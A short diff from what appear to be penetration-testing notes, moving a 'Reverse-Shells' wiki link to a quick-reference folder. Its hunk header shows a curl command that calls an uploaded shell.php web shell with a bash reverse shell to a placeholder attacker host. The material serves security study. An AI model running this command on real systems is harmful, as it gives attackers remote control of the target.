@@ -201,4 +201,4 @@ curl "http://<IP>/uploads/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/<LHOST>/<LPO
 
 - [[07-Web-Application/Web-Scanning]] → Finding upload endpoints
 - [[07-Web-Application/Directory-Fuzzing]] → Path enumeration
-- [[04-Exploitation/Reverse-Shells]] → Shell payloads
+- [[00-Quick-Reference/Reverse-Shells]] → Shell payloads
